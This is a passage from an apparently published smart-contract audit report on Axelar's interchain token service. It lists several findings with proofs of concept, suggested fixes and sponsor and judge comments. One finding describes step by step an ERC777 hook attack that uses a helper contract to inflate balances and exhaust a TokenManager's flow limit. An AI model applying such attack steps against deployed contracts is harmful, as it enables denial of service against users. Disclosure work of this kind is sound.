return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Where <code>&#x3C;TOKEN_MANAGER_ADDRESS></code> is the address of the relevant <code>TokenManager</code> and <code>maliciousContractHelper</code> is an instance of <code>MaliciousContractHelper</code>. That exposes the <code>sendMeT</code> function, which will send all tokens that it has to the <code>MaliciousContract</code> instance that called it.</p>\n<ol start=\"8\">\n<li><code>maliciousContractHelper</code> has a lot of tokens <code>T</code>, so when <code>tokensReceived</code> returns, <code>T.balanceOf(MaliciousContract)</code> will increase a lot despite the fact that only a dust amount of <code>T</code> was sent from <code>TokenManager</code>.</li>\n<li>The execution will return to <code>_giveToken</code> and returned value will be huge, since <code>IERC20(token).balanceOf(to) - balance</code> will now be a big value, despite the fact that <code>amount</code> was close to <code>0</code>.</li>\n<li>Flow in amount will increase a lot, so that <code>flowLimit</code> is reached and Alice’s transaction will not be processed.</li>\n</ol>\n<p>In short, Bob has increased the flow in amount for <code>TokenManager</code> by sending to their contract a lot of money in <code>ERC777</code> <code>tokensReceived</code> hook from their other contract. It didn’t cost them much since they sent only a tiny amount of <code>T</code> between blockchains. Hence they could use almost all of their <code>T</code> tokens for the attack.</p>\n<p>Of course Bob could perform this attack without waiting for Alice to submit their transaction. The scenario presented above was just an example. In reality, Bob can do this at any moment.</p>\n<p>It also seems possible to transfer tokens from the same blockchain to itself (by specifying wrong <code>destinationChain</code> in <code>sendToken</code> or just by specifying <code>destinationChain = &#x3C;CURRENT_CHAIN></code>), so Bob can have their tokens <code>T</code> only on one blockchain.</p>\n<p>If gas price on that blockchain is low, Bob can perform that attack a lot of times. All they need to do is to send tokens back to <code>MaliciousContractHelper</code> after each attack (so that it can send it to <code>MaliciousContract</code> as described above). Finally, they will reach <code>flowLimit</code> for <code>TokenManager</code> and will cause denial of service.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I would recommend doing one of the following:</p>\n<ul>\n<li>Acknowledge the issue and warn users that the protocol doesn’t support <code>ERC777</code> tokens (possibly even check and if <code>TokenManager</code> with <code>ERC777</code> underlying token is to be deployed - just revert)</li>\n<li>Correct the value returned by <code>_giveTokens</code> to ensure that it doesn’t exceed <code>amount</code>, as follows:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/332#issuecomment-1694549078\">deanamiel (Axelar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed so that the amount returned can never be higher than the initial amount.</p>\n<p>Public PR link:\n<a href=\"https://github.com/axelarnetwork/interchain-token-service/pull/102\">https://github.com/axelarnetwork/interchain-token-service/pull/102</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-remoteaddressvalidator-can-incorrectly-convert-addresses-to-lowercase\" style=\"position:relative;\"><a href=\"#m-03-remoteaddressvalidator-can-incorrectly-convert-addresses-to-lowercase\" aria-label=\"m 03 remoteaddressvalidator can incorrectly convert addresses to lowercase permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/323\">[M-03] <code>RemoteAddressValidator</code> can incorrectly convert addresses to lowercase</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/323\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/486\">Shubham</a> and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/434\">Chom</a></em></p>\n<p>The <code>validateSender</code> and <code>addTrustedAddress</code> functions of <code>RemoteAddressValidator</code> can incorrectly handle the passed address arguments, which will result in false negatives. E.g. a valid sender address may be invalidated.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L54\">RemoteAddressValidator._lowerCase</a> function is used to convert an address to lowercase. Since the protocol is expected to support different EVM and non-EVM chains, account addresses may have different format, thus the necessity to convert them to strings and to convert the strings to lowercase when comparing them. However, the function only converts the hexadecimal letters, i.e. the characters in ranges A-F:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">b</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">65</span><span class=\"mtk1\">) &amp;&amp; (</span><span class=\"mtk12\">b</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">70</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">)[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">bytes1</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk7\">32</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Here, <code>65</code> corresponds to <code>A</code>, and <code>70</code> corresponds to <code>F</code>. But, since different EVM and non-EVM chains are supported, addresses can contain other characters. For example, <a href=\"https://docs.cosmos.network/main/spec/addresses/bech32\">Cosmos uses bech32 addresses</a> and <a href=\"https://docs.evmos.org/protocol/concepts/accounts#address-formats-for-clients\">Evmos supports both hexadecimal and bech32 addresses</a>.</p>\n<p>If not all alphabetical characters of an address are converted to lowercase, then the address comparison in the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L69\">validateSender</a> can fail and result in a false revert.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <code>_lowerCase</code> function, consider converting all alphabetical characters to lowercase, e.g.:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/its/remote-address-validator/RemoteAddressValidator.sol b/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index bb101e5..e83431b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -55,7 +55,7 @@ contract RemoteAddressValidator is IRemoteAddressValidator, Upgradable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 length = bytes(s).length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i; i &lt; length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint8 b = uint8(bytes(s)[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if ((b &gt;= 65) &amp;&amp; (b &lt;= 70)) bytes(s)[i] = bytes1(b + uint8(32));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if ((b &gt;= 65) &amp;&amp; (b &lt;= 90)) bytes(s)[i] = bytes1(b + uint8(32));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return s;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/323#issuecomment-1695942282\">deanamiel (Axelar) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Corrected Severity: QA</p>\n<p>This was originally meant to cover the EVM addresses, but we implemented a fix to account for non-EVM addresses as well.</p>\n<p>Public PR link:\n<a href=\"https://github.com/axelarnetwork/interchain-token-service/pull/96\">https://github.com/axelarnetwork/interchain-token-service/pull/96</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/323#issuecomment-1702641616\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’m maintaining the medium severity for this issue as it prevents using any non-EVM addresses.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/323#issuecomment-1801759103\">milapsheth (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>We consider this finding QA or Low severity since the scope of the implementation is for EVM chains (even though Axelar’s cross-chain messaging API is generic). Non EVM chains require further consideration that wasn’t the focus for this version.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-proposal-requiring-native-coin-transfers-cannot-be-executed\" style=\"position:relative;\"><a href=\"#m-04-proposal-requiring-native-coin-transfers-cannot-be-executed\" aria-label=\"m 04 proposal requiring native coin transfers cannot be executed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319\">[M-04] Proposal requiring native coin transfers cannot be executed</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/476\">libratus</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/468\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/454\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/367\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/344\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/331\">qpzm</a>, Emmanuel (<a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/290\">1</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/289\">2</a>), <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/218\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/217\">0xkazim</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/150\">UniversalCrypto</a>, and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/12\">T1MOH</a></em></p>\n<h3 id=\"lines-of-code-2\" style=\"position:relative;\"><a href=\"#lines-of-code-2\" aria-label=\"lines of code 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p>Proposals that require sending native coins in at least one of their calls cannot be executed.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L41\">InterchainProposalExecutor._execute</a> executes cross-chain governance proposals. The function <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L54\">extracts the list of calls to make under the proposal</a> and <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L73\">calls <code>_executeProposal</code></a>. <code>_executeProposal</code>, in its turn, makes distinct calls and sends native coins along with each call as specified by the <code>call.value</code> argument:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, <code>InterchainProposalExecutor._execute</code> is called from a non-payable function, <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/gmp-sdk/executable/AxelarExecutable.sol#L17\">AxelarExecutable.execute</a>, and thus native coins cannot be passed in the call. As a result, proposal calls that have the <code>value</code> argument greater than <code>0</code> cannot be executed.</p>\n<p>Sending native funds to the contract in advance cannot be a solution because such funds can be stolen by back-running and executing a proposal that would consume them.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider implementing an alternative <code>AxelarExecutable</code> contract (i.e. <code>AxelarExecutablePayable</code>) that has the <code>execute</code> function payable and consider inheriting in <code>InterchainProposalExecutor</code> from this alternative implementation, not from <code>AxelarExecutable</code>.</p>\n<h3 id=\"assessed-type-3\" style=\"position:relative;\"><a href=\"#assessed-type-3\" aria-label=\"assessed type 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Payable</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319#issuecomment-1678528117\">deanamiel (Axelar) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>The intention is for the contract that executes the proposal to have been already funded with native value. Native value is not meant to be sent with the call to <code>AxelarExecutable.execute()</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319#issuecomment-1702654158\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The <code>InterchainProposalExecutor</code> contract, in line 20, states that this contract is abstract. The only derived contract in the repository is the <code>TestProposalExecutor</code> intended for testing purposes. @deanamiel - can you show the concrete implementation for such a derived contract that is going to be deployed?</p>\n<p>Given the code in scope, there would not be a <code>receive</code> function to be able to fund the contract with native tokens. This would render this submission valid.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319#issuecomment-1709224208\">deanamiel (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>So it would be the contract that inherits <code>AxelarExecutable</code> that would need to be funded with native value for proposal execution. If we look at <code>InterchainGovernance</code> as an example, this contract does contain a receive function <a href=\"https://github.com/axelarnetwork/axelar-gmp-sdk-solidity/blob/main/contracts/governance/InterchainGovernance.sol#L203\">here</a>. Does this answer your question?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319#issuecomment-1711476650\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@deanamiel - the issue is that the <code>InterchainProposalExecutor</code> contract can not be funded with native funds, but attempts to execute proposals (target contracts) that potentially require native funds (see <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L76\">L76</a>).</p>\n<p>I’m inclined to leave this submission as medium severity, as it does not allow using the <code>InterchainProposalExecutor</code> contract in conjunction with proposals that require native funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/319#issuecomment-1801775763\">milapsheth (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge the severity. The solution is to add a receive function as mentioned in <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/344\">#344</a>, since the design expects to fund tokens to the contract and then execute. This funding <code>+</code> execution can be done within a contract atomically if there’s a concern of another proposal stealing tokens.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-gas-fees-are-refunded-to-a-wrong-address-when-transferring-tokens-via-interchaintokeninterchaintransferfrom\" style=\"position:relative;\"><a href=\"#m-05-gas-fees-are-refunded-to-a-wrong-address-when-transferring-tokens-via-interchaintokeninterchaintransferfrom\" aria-label=\"m 05 gas fees are refunded to a wrong address when transferring tokens via interchaintokeninterchaintransferfrom permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/316\">[M-05] Gas fees are refunded to a wrong address when transferring tokens via <code>InterchainToken.interchainTransferFrom</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/316\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/456\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/336\">immeas</a>, and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/166\">pcarranzav</a></em></p>\n<p>In a case when gas fees are refunded for a token transfer made via the <code>InterchainToken.interchainTransferFrom</code> function, the fees will be refunded to the owner of the tokens, not the address that actually paid the fees. As a result, the sender will lose the fees paid for the cross-chain transaction and will not receive tokens on the other chain; the owner of the token will have their tokens and will receive the fees.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token/InterchainToken.sol#L79\">InterchainToken.interchainTransferFrom</a> function is used to transfer tokens cross-chain. The function is identical to the <code>ERC20.transferFrom</code> function: an approved address can send someone else’s tokens to another chain. Since this is a cross-chain transaction, the sender also has to pay the additional gas fee for executing the transaction:</p>\n<ol>\n<li>The function calls <a 